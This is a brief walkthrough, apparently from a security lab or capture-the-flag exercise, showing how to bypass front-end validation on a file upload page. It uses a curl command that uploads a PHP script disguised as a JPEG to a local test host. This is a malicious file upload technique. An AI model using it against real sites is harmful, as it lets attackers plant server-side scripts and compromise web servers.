We want to inject a php script using the file upload page, to override the frontend validation we use CURL wich is a great tool for making requests to servers.

We will use the -F (--form) option in order to upload a file with CURL.

curl POST -F 'Upload=Upload' -F 'uploaded=@/Users/isifeddi/Desktop/ilyas.php;type=image/jpeg' 'http://10.12.100.44/?page=upload'
